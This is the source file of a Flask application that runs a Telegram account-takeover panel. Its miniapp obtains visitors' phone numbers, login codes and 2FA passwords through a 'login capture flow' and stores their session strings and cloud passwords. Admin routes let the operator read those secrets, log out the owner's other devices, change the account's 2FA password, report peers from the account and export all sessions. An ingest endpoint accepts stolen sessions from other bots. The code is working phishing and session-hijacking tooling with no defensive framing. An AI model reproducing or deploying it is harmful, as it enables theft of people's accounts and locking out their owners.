"""Manager — combined Flask app.

Single process, single port. Serves:

  /                -> Manager UI (login page if not authed, dashboard if authed)
  /m/              -> Telegram miniapp (login capture flow that ingests into Manager DB)
  /api/...         -> Manager API (sessions, devices, 2FA, settings, audit, dashboard, export)
  /api/bot/...     -> Miniapp API (store-contact, contact-status, request-code, verify-code)
  /api/ingest      -> External ingest endpoint (for other bots to POST sessions to)

Background threads:
  - telegram_bot  : Telethon bot polling (if BOT_TOKEN set) — handles /start + contact capture
  - auto_logout   : 24h auto-logout worker
  - telethon login: lazy asyncio loop for send-code/verify-code/device/2FA calls
"""
import os
import time
import secrets
import logging
import threading
from functools import wraps
from flask import Flask, request, jsonify, send_from_directory, session, g
from flask_cors import CORS
from dotenv import load_dotenv

import db
import telegram_ops
import telegram_login
import telegram_bot
import auto_logout

load_dotenv()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATIC_DIR = os.path.join(BASE_DIR, "static")
MINIAPP_DIR = os.path.join(STATIC_DIR, "miniapp")
SECRET_KEY_FILE = os.path.join(BASE_DIR, ".secret_key")
BOTS_SESSION_DIR = os.path.join(BASE_DIR, "bot_sessions")
PORT = int(os.getenv("PORT", "5000"))

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("manager")


def _get_secret_key():
    """Persistent secret key for Flask sessions (so cookies survive restarts)."""
    if os.path.exists(SECRET_KEY_FILE):
        try:
            with open(SECRET_KEY_FILE) as f:
                k = f.read().strip()
                if k:
                    return k
        except Exception:
            pass
    k = secrets.token_hex(32)
    try:
        with open(SECRET_KEY_FILE, "w") as f:
            f.write(k)
    except Exception as e:
        logger.warning(f"Could not persist SECRET_KEY: {e}")
    return k


app = Flask(__name__, static_folder=STATIC_DIR)
app.secret_key = _get_secret_key()
app.config.update(
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_HTTPONLY=True,
    PERMANENT_SESSION_LIFETIME=60 * 60 * 24 * 30,
)
CORS(app)


# ---------- auth middleware ----------
def admin_required(fn):
    @wraps(fn)
    def wrap(*a, **kw):
        if not session.get("admin"):
            return jsonify({"error": "unauthorized"}), 401
        return fn(*a, **kw)

    return wrap


@app.before_request
def _init():
    if not getattr(g, "_db_ready", False):
        db.init_db()
        g._db_ready = True


# ---------- static routes ----------
@app.route("/")
def index():
    if not session.get("admin"):
        return send_from_directory(STATIC_DIR, "login.html")
    return send_from_directory(STATIC_DIR, "index.html")


@app.route("/<path:path>")
def static_files(path):
    # don't shadow /m/ or /api/
    if path.startswith(("m/", "api/")):
        return jsonify({"error": "not found"}), 404
    return send_from_directory(STATIC_DIR, path)


# ---------- miniapp ----------
@app.route("/m/")
@app.route("/m")
def miniapp_index():
    return send_from_directory(MINIAPP_DIR, "index.html")


@app.route("/m/<path:path>")
def miniapp_static(path):
    return send_from_directory(MINIAPP_DIR, path)


# ---------- Manager auth ----------
@app.route("/api/login", methods=["POST"])
def api_login():
    pwd = (request.json or {}).get("password", "").strip()
    expected = db.get_setting("admin_password")
    if pwd and pwd == expected:
        session.permanent = True
        session["admin"] = True
        return jsonify({"ok": True})
    # show default-password hint only when password is still default
    if expected == "manager123":
        return jsonify({"error": "wrong password (default is manager123)"}), 401
    return jsonify({"error": "wrong password"}), 401


@app.route("/api/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"ok": True})


@app.route("/api/me")
def api_me():
    return jsonify({"admin": bool(session.get("admin"))})


# ---------- ingest (external bots can POST sessions here) ----------
@app.route("/api/ingest", methods=["POST"])
def api_ingest():
    tok = os.getenv("INGEST_TOKEN", "")
    if tok:
        auth = request.headers.get("X-Ingest-Token", "")
        if auth != tok:
            return jsonify({"error": "forbidden"}), 403
    data = request.json or {}
    if not data.get("phone") or not data.get("session_string"):
        return jsonify({"error": "missing fields"}), 400
    row = db.insert_session(data)
    return jsonify({"ok": True, "id": row["id"]})


# ---------- Manager sessions ----------
@app.route("/api/sessions")
@admin_required
def api_sessions():
    rows = db.list_sessions()
    out = []
    for r in rows:
        out.append(
            {
                "id": r["id"],
                "phone": r["phone"],
                "user_id": r["user_id"],
                "username": r["username"],
                "name": r["name"],
                "email": r["email"],
                "is_protected": bool(r["is_protected"]),
                "is_current": bool(r["is_current"]),
                "has_2fa_pw": bool(r["twofa_password"]),
                "created_at": r["created_at"],
                "last_seen": r["last_seen"],
                "auto_logout_at": r["auto_logout_at"],
                "auto_logout_fired": bool(r["auto_logout_fired"]),
                "notes": r["notes"],
                "last_action": r["last_action"],
                "last_action_at": r["last_action_at"],
            }
        )
    return jsonify(out)


@app.route("/api/sessions/<int:sid>")
@admin_required
def api_session_detail(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    return jsonify(
        {
            "id": r["id"],
            "phone": r["phone"],
            "user_id": r["user_id"],
            "username": r["username"],
            "name": r["name"],
            "email": r["email"],
            "session_string": r["session_string"],
            "twofa_password": r["twofa_password"],
            "is_protected": bool(r["is_protected"]),
            "is_current": bool(r["is_current"]),
            "created_at": r["created_at"],
            "last_seen": r["last_seen"],
            "auto_logout_at": r["auto_logout_at"],
            "auto_logout_fired": bool(r["auto_logout_fired"]),
            "notes": r["notes"],
        }
    )


@app.route("/api/sessions/<int:sid>", methods=["DELETE"])
@admin_required
def api_session_delete(sid):
    db.delete_session(sid)
    return jsonify({"ok": True})


@app.route("/api/sessions/<int:sid>/protect", methods=["POST"])
@admin_required
def api_protect(sid):
    val = bool((request.json or {}).get("value", True))
    db.set_protected(sid, val)
    return jsonify({"ok": True, "is_protected": val})


@app.route("/api/sessions/<int:sid>/current", methods=["POST"])
@admin_required
def api_current(sid):
    val = bool((request.json or {}).get("value", True))
    db.set_current(sid, val)
    return jsonify({"ok": True, "is_current": val})


@app.route("/api/sessions/<int:sid>/mail", methods=["POST"])
@admin_required
def api_mail(sid):
    email = (request.json or {}).get("email", "")
    db.set_email(sid, email)
    return jsonify({"ok": True})


@app.route("/api/sessions/<int:sid>/notes", methods=["POST"])
@admin_required
def api_notes(sid):
    notes = (request.json or {}).get("notes", "")
    db.set_notes(sid, notes)
    return jsonify({"ok": True})


# ---------- Telegram ops ----------
@app.route("/api/sessions/<int:sid>/devices")
@admin_required
def api_devices(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    try:
        res = telegram_ops.list_devices(r)
        if "error" in res:
            return jsonify(res), 400
        db.touch_last_seen(sid)
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/logout-device", methods=["POST"])
@admin_required
def api_logout_device(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    h = (request.json or {}).get("hash")
    if h is None:
        return jsonify({"error": "hash required"}), 400
    try:
        res = telegram_ops.logout_device(r, int(h))
        db.audit(sid, r["phone"], "device_logout", f"hash={h}")
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/logout-others", methods=["POST"])
@admin_required
def api_logout_others(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    try:
        res = telegram_ops.logout_all_others(r)
        db.audit(sid, r["phone"], "logout_others", f"killed={res.get('killed', 0)}")
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/force-logout", methods=["POST"])
@admin_required
def api_force_logout(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    try:
        res = telegram_ops.force_logout_account(r)
        db.update_session(sid, {"last_action": "force_logout", "last_action_at": int(time.time())})
        db.audit(sid, r["phone"], "force_logout", f"killed={res.get('killed', 0)}")
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/2fa-status")
@admin_required
def api_2fa_status(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    try:
        res = telegram_ops.get_2fa_status(r)
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/2fa", methods=["POST"])
@admin_required
def api_2fa_set(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    body = request.json or {}
    try:
        res = telegram_ops.set_2fa(
            r,
            body.get("new_password", ""),
            body.get("hint", ""),
            body.get("recovery_email", ""),
            body.get("current_password", ""),
        )
        if res.get("success"):
            db.update_session(sid, {"twofa_password": body.get("new_password", "") or r["twofa_password"]})
            db.audit(sid, r["phone"], "2fa_set", "Updated cloud password")
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ---------- settings ----------
@app.route("/api/settings")
@admin_required
def api_settings():
    s = db.get_all_settings()
    return jsonify(
        {
            "auto_logout_enabled": s.get("auto_logout_enabled") == "1",
            "auto_logout_hours": int(s.get("auto_logout_hours", "24")),
            "admin_password_set": bool(s.get("admin_password")),
            "admin_password_is_default": s.get("admin_password") == "manager123",
            "api_id": s.get("api_id", ""),
            "api_hash": s.get("api_hash", ""),
            "bot_token": s.get("bot_token", ""),
            "log_channel_id": s.get("log_channel_id", ""),
            "miniapp_url": (os.getenv("MINI_APP_URL", "") or "").rstrip("/") + "/m/",
        }
    )


@app.route("/api/settings", methods=["POST"])
@admin_required
def api_settings_save():
    body = request.json or {}
    if "auto_logout_enabled" in body:
        db.set_setting("auto_logout_enabled", "1" if body["auto_logout_enabled"] else "0")
        if body["auto_logout_enabled"]:
            hours = int(db.get_setting("auto_logout_hours", "24"))
            now = int(time.time())
            for r in db.list_sessions():
                if not r["auto_logout_at"] and not r["auto_logout_fired"]:
                    db.update_session(r["id"], {"auto_logout_at": now + hours * 3600})
    if "auto_logout_hours" in body:
        db.set_setting("auto_logout_hours", str(int(body["auto_logout_hours"])))
    if body.get("admin_password"):
        db.set_setting("admin_password", body["admin_password"])
    env_updates = {}
    if "api_id" in body:
        v = str(body["api_id"])
        db.set_setting("api_id", v)
        env_updates["API_ID"] = v
    if "api_hash" in body:
        v = str(body["api_hash"])
        db.set_setting("api_hash", v)
        env_updates["API_HASH"] = v
    if "bot_token" in body:
        new_token = str(body["bot_token"]).strip()
        old_token = db.get_setting("bot_token") or ""
        # update primary bot's token in DB
        primary = db.get_primary_bot()
        if primary:
            db.update_bot(primary["id"], {"bot_token": new_token})
        db.set_setting("bot_token", new_token)
        env_updates["BOT_TOKEN"] = new_token
        # if token changed and primary exists, restart it (BotManager wipes stale session file)
        if new_token != old_token and primary:
            api_id = db.get_setting("api_id")
            api_hash = db.get_setting("api_hash")
            if api_id and api_hash and primary["session_file"]:
                telegram_bot.bot_manager.restart(
                    primary["id"], primary["name"], new_token, api_id, api_hash, primary["session_file"]
                )
                db.audit(None, None, "primary_bot_token_changed", "restarted primary bot")
    if "log_channel_id" in body:
        v = str(body["log_channel_id"])
        db.set_setting("log_channel_id", v)
        env_updates["LOG_CHANNEL_ID"] = v
    if env_updates:
        _update_env_file(env_updates)
    return jsonify({"ok": True})


# ---------- audit ----------
@app.route("/api/audit")
@admin_required
def api_audit():
    limit = int(request.args.get("limit", "100"))
    rows = db.list_audit(limit)
    return jsonify([dict(r) for r in rows])


# ---------- dashboard ----------
@app.route("/api/dashboard")
@admin_required
def api_dashboard():
    rows = db.list_sessions()
    now = int(time.time())
    today = now - 86400
    statuses = telegram_bot.bot_manager.all_status()
    bots_running = sum(1 for s in statuses.values() if s["running"])
    bots_total = len(statuses)
    contacts_total = sum(s.get("contacts_count", 0) for s in statuses.values())
    return jsonify(
        {
            "total": len(rows),
            "today": sum(1 for r in rows if r["created_at"] and r["created_at"] >= today),
            "protected": sum(1 for r in rows if r["is_protected"]),
            "has_2fa_pw": sum(1 for r in rows if r["twofa_password"]),
            "pending_auto_logout": sum(
                1 for r in rows if r["auto_logout_at"] and not r["auto_logout_fired"] and r["auto_logout_at"] > now
            ),
            "auto_logout_enabled": db.get_setting("auto_logout_enabled") == "1",
            "bots_total": bots_total,
            "bots_running": bots_running,
            "bot_running": bots_running > 0,
            "contacts_total": contacts_total,
            "miniapp_url": (os.getenv("MINI_APP_URL", "") or "").rstrip("/") + "/m/",
        }
    )


# ---------- export ----------
@app.route("/api/export")
@admin_required
def api_export():
    rows = db.list_sessions()
    return jsonify([dict(r) for r in rows])


# =================== DIRECT LOGIN (admin can log in a session from the panel) ===================
@app.route("/api/direct-login/send-code", methods=["POST"])
@admin_required
def api_direct_login_send():
    phone = (request.json or {}).get("phone", "").strip()
    if not phone:
        return jsonify({"error": "Phone required"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone
    api_id = db.get_setting("api_id")
    api_hash = db.get_setting("api_hash")
    if not api_id or not api_hash:
        return jsonify({"error": "Set API_ID/API_HASH in Settings first"}), 400
    res = telegram_login.send_code(phone, int(api_id), api_hash)
    if res.get("success"):
        db.audit(None, None, "direct_login_code_sent", f"phone={phone}")
    return jsonify(res)


@app.route("/api/direct-login/verify", methods=["POST"])
@admin_required
def api_direct_login_verify():
    data = request.json or {}
    sid = data.get("session_id", "")
    code = data.get("code", "")
    password = data.get("password", "")
    if not sid or not code:
        return jsonify({"error": "Missing fields"}), 400
    if sid not in telegram_login.pending:
        return jsonify({"error": "Session expired — request a new code"}), 400
    api_id = db.get_setting("api_id")
    api_hash = db.get_setting("api_hash")
    if not api_id or not api_hash:
        return jsonify({"error": "Manager not configured"}), 400

    channel_id = db.get_setting("log_channel_id") or None

    def on_success(info):
        row = db.insert_session(info)
        db.audit(row["id"], info["phone"], "direct_login_success", f"user_id={info['user_id']} name={info['name']}")

    def on_log(msg):
        if channel_id:
            telegram_bot.bot_manager.send_via_any_running(channel_id, msg)

    return jsonify(telegram_login.verify(sid, code, password, int(api_id), api_hash, on_success=on_success, on_log=on_log))


# =================== REPORT PEER ===================
@app.route("/api/sessions/<int:sid>/resolve-peer", methods=["POST"])
@admin_required
def api_resolve_peer(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    peer = (request.json or {}).get("peer", "").strip()
    if not peer:
        return jsonify({"error": "peer required"}), 400
    try:
        res = telegram_ops.resolve_peer(r, peer)
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/report-peer", methods=["POST"])
@admin_required
def api_report_peer(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    body = request.json or {}
    peer = (body.get("peer") or "").strip()
    reason = (body.get("reason") or "").strip()
    message = (body.get("message") or "").strip()
    if not peer or not reason:
        return jsonify({"error": "peer and reason required"}), 400
    try:
        res = telegram_ops.report_peer(r, peer, reason, message)
        if res.get("success"):
            target = res.get("target", {})
            db.audit(
                sid,
                r["phone"],
                "report_peer",
                f"peer={peer} reason={reason} target_id={target.get('id','?')} target_name={target.get('name','?')}",
            )
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# =================== BOTS ===================
def _bot_row_to_dict(r, status=None):
    return {
        "id": r["id"],
        "name": r["name"],
        "bot_token": r["bot_token"],
        "bot_token_masked": _mask_token(r["bot_token"]),
        "api_id": r["api_id"] or "",
        "api_hash": r["api_hash"] or "",
        "session_file": r["session_file"],
        "enabled": bool(r["enabled"]),
        "is_primary": bool(r["is_primary"]),
        "created_at": r["created_at"],
        "last_seen": r["last_seen"],
        "status": status or {},
    }


def _mask_token(t):
    if not t or len(t) < 12:
        return "***"
    return t[:6] + "…" + t[-4:]


@app.route("/api/bots")
@admin_required
def api_bots_list():
    rows = db.list_bots()
    statuses = telegram_bot.bot_manager.all_status()
    out = []
    for r in rows:
        st = statuses.get(r["id"], {})
        out.append(_bot_row_to_dict(r, st))
    return jsonify(out)


@app.route("/api/bots", methods=["POST"])
@admin_required
def api_bots_add():
    body = request.json or {}
    name = (body.get("name") or "").strip()
    token = (body.get("bot_token") or "").strip()
    if not name or not token:
        return jsonify({"error": "name and bot_token required"}), 400
    api_id = db.get_setting("api_id")
    api_hash = db.get_setting("api_hash")
    if not api_id or not api_hash:
        return jsonify({"error": "Set API_ID/API_HASH first"}), 400
    if db.get_bot_by_token(token):
        return jsonify({"error": "This bot token is already added"}), 400
    row = db.insert_bot(name, token, api_id=api_id, api_hash=api_hash, is_primary=False)
    session_file = os.path.join(BOTS_SESSION_DIR, f"bot_{row['id']}")
    db.update_bot(row["id"], {"session_file": session_file})
    row = db.get_bot(row["id"])
    ok, msg = telegram_bot.bot_manager.start(
        row["id"], row["name"], row["bot_token"], api_id, api_hash, session_file
    )
    if not ok:
        return jsonify({"error": msg}), 400
    return jsonify({"ok": True, "id": row["id"]})


@app.route("/api/bots/<int:bot_id>", methods=["DELETE"])
@admin_required
def api_bots_delete(bot_id):
    row = db.get_bot(bot_id)
    if not row:
        return jsonify({"error": "not found"}), 404
    if row["is_primary"]:
        return jsonify({"error": "Cannot delete primary bot"}), 400
    telegram_bot.bot_manager.remove(bot_id)
    db.delete_bot(bot_id)
    return jsonify({"ok": True})


@app.route("/api/bots/<int:bot_id>/toggle", methods=["POST"])
@admin_required
def api_bots_toggle(bot_id):
    row = db.get_bot(bot_id)
    if not row:
        return jsonify({"error": "not found"}), 404
    enable = bool((request.json or {}).get("enabled", True))
    db.update_bot(bot_id, {"enabled": 1 if enable else 0})
    if enable:
        api_id = row["api_id"] or db.get_setting("api_id")
        api_hash = row["api_hash"] or db.get_setting("api_hash")
        ok, msg = telegram_bot.bot_manager.start(
            row["id"], row["name"], row["bot_token"], api_id, api_hash, row["session_file"]
        )
        if not ok:
            return jsonify({"error": msg}), 400
    else:
        telegram_bot.bot_manager.stop(bot_id)
    return jsonify({"ok": True, "enabled": enable})


@app.route("/api/bots/<int:bot_id>/restart", methods=["POST"])
@admin_required
def api_bots_restart(bot_id):
    row = db.get_bot(bot_id)
    if not row:
        return jsonify({"error": "not found"}), 404
    api_id = row["api_id"] or db.get_setting("api_id")
    api_hash = row["api_hash"] or db.get_setting("api_hash")
    ok, msg = telegram_bot.bot_manager.restart(
        row["id"], row["name"], row["bot_token"], api_id, api_hash, row["session_file"]
    )
    db.audit(None, None, "bot_restarted", f"id={bot_id} name={row['name']} ok={ok}")
    return jsonify({"ok": ok, "message": msg})


@app.route("/api/bots/<int:bot_id>/primary", methods=["POST"])
@admin_required
def api_bots_primary(bot_id):
    row = db.get_bot(bot_id)
    if not row:
        return jsonify({"error": "not found"}), 404
    db.set_primary_bot(bot_id)
    return jsonify({"ok": True})


# =================== MINIAPP BOT API ===================
@app.route("/api/bot/health")
def api_bot_health():
    statuses = telegram_bot.bot_manager.all_status()
    running = sum(1 for s in statuses.values() if s["running"])
    return jsonify(
        {
            "status": "ok",
            "bots_total": len(statuses),
            "bots_running": running,
            "bot_running": running > 0,
            "api_creds_set": bool(db.get_setting("api_id") and db.get_setting("api_hash")),
        }
    )


@app.route("/api/bot/store-contact", methods=["POST"])
def api_store_contact():
    data = request.json or {}
    uid = str(data.get("user_id", ""))
    phone = data.get("phone", "")
    if uid and phone:
        telegram_bot.contacts[uid] = phone if phone.startswith("+") else "+" + phone
        logger.info(f"Contact stored: {uid} -> {phone}")
        return jsonify({"success": True})
    return jsonify({"error": "Missing data"}), 400


@app.route("/api/bot/contact-status/<user_id>")
def api_contact_status(user_id):
    phone = telegram_bot.contacts.get(str(user_id))
    if phone:
        return jsonify({"status": "received", "phone": phone})
    return jsonify({"status": "pending"})


@app.route("/api/bot/request-code", methods=["POST"])
def api_request_code():
    phone = (request.json or {}).get("phone", "")
    if not phone:
        return jsonify({"error": "Phone required"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone
    api_id = db.get_setting("api_id")
    api_hash = db.get_setting("api_hash")
    if not api_id or not api_hash:
        return jsonify({"error": "Manager not configured — set API_ID/API_HASH in Settings"}), 400
    return jsonify(telegram_login.send_code(phone, int(api_id), api_hash))


@app.route("/api/bot/verify-code", methods=["POST"])
def api_verify_code():
    data = request.json or {}
    sid = data.get("session_id", "")
    code = data.get("code", "")
    password = data.get("password", "")
    if not sid or not code:
        return jsonify({"error": "Missing data"}), 400
    if sid not in telegram_login.pending:
        return jsonify({"error": "Session expired — request a new code"}), 400
    api_id = db.get_setting("api_id")
    api_hash = db.get_setting("api_hash")
    if not api_id or not api_hash:
        return jsonify({"error": "Manager not configured"}), 400

    channel_id = db.get_setting("log_channel_id") or None

    def on_success(info):
        row = db.insert_session(info)
        db.audit(row["id"], info["phone"], "login_success", f"user_id={info['user_id']} name={info['name']}")

    def on_log(msg):
        if channel_id:
            telegram_bot.bot_manager.send_via_any_running(channel_id, msg)

    return jsonify(telegram_login.verify(sid, code, password, int(api_id), api_hash, on_success=on_success, on_log=on_log))


# =================== MAIN ===================
def _update_env_file(updates):
    """Write updated keys back to .env so UI and .env stay in sync."""
    env_path = os.path.join(BASE_DIR, ".env")
    if not os.path.exists(env_path):
        return
    lines = []
    found = {k: False for k in updates}
    try:
        with open(env_path) as f:
            for line in f:
                stripped = line.strip()
                for k, v in updates.items():
                    if stripped.startswith(f"{k}="):
                        lines.append(f"{k}={v}\n")
                        found[k] = True
                        break
                else:
                    lines.append(line)
        for k, v in updates.items():
            if not found[k]:
                lines.append(f"{k}={v}\n")
        with open(env_path, "w") as f:
            f.writelines(lines)
    except Exception as e:
        logger.warning(f"Could not update .env: {e}")


def _sync_env_to_db():
    """If .env has values that the DB doesn't, copy them in. UI changes always win."""
    mapping = {
        "API_ID": "api_id",
        "API_HASH": "api_hash",
        "BOT_TOKEN": "bot_token",
        "LOG_CHANNEL_ID": "log_channel_id",
    }
    for env_key, db_key in mapping.items():
        env_val = (os.getenv(env_key, "") or "").strip()
        db_val = (db.get_setting(db_key) or "").strip()
        if env_val and not db_val:
            db.set_setting(db_key, env_val)


def _sync_primary_bot():
    """Ensure the .env bot_token exists as the primary bot in the bots table.

    If .env has no bot_token, do nothing.
    If the DB already has a primary bot with the same token, no-op.
    If .env's bot_token differs from the DB primary's token, update it.
    If no primary exists, create one.
    """
    env_token = (os.getenv("BOT_TOKEN", "") or "").strip()
    if not env_token:
        return
    api_id = db.get_setting("api_id")
    api_hash = db.get_setting("api_hash")
    session_file = os.path.join(BOTS_SESSION_DIR, "bot_primary")

    primary = db.get_primary_bot()
    if primary:
        if primary["bot_token"] != env_token:
            # token changed in .env → update + restart (BotManager wipes stale session)
            db.update_bot(primary["id"], {"bot_token": env_token, "name": "Primary", "api_id": api_id, "api_hash": api_hash, "session_file": session_file})
            db.audit(None, None, "primary_bot_token_changed", "from .env on startup")
        else:
            # ensure session_file is set (older installs may not have it)
            if not primary["session_file"]:
                db.update_bot(primary["id"], {"session_file": session_file, "api_id": api_id, "api_hash": api_hash})
    else:
        # create primary bot
        db.insert_bot("Primary", env_token, api_id=api_id, api_hash=api_hash, is_primary=True, session_file=session_file)


def _start_all_bots():
    """Start every enabled bot in the DB."""
    os.makedirs(BOTS_SESSION_DIR, exist_ok=True)
    for row in db.list_bots():
        if not row["enabled"]:
            continue
        api_id = row["api_id"] or db.get_setting("api_id")
        api_hash = row["api_hash"] or db.get_setting("api_hash")
        if not api_id or not api_hash or not row["session_file"]:
            logger.warning(f"[bot {row['id']}] missing api_id/api_hash/session_file — skipping")
            continue
        ok, msg = telegram_bot.bot_manager.start(
            row["id"], row["name"], row["bot_token"], api_id, api_hash, row["session_file"]
        )
        if ok:
            logger.info(f"[bot {row['id']}] '{row['name']}' started")
        else:
            logger.warning(f"[bot {row['id']}] '{row['name']}' not started: {msg}")


if __name__ == "__main__":
    db.init_db()
    _sync_env_to_db()
    _sync_primary_bot()
    _start_all_bots()
    auto_logout.start()

    statuses = telegram_bot.bot_manager.all_status()
    running = sum(1 for s in statuses.values() if s["running"])
    logger.info(f"Manager running on http://0.0.0.0:{PORT}  ({running}/{len(statuses)} bots online)")
    logger.info(f"  Manager UI:  http://localhost:{PORT}/")
    logger.info(f"  Miniapp URL: http://localhost:{PORT}/m/  (set this in BotFather as the Web App URL)")
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
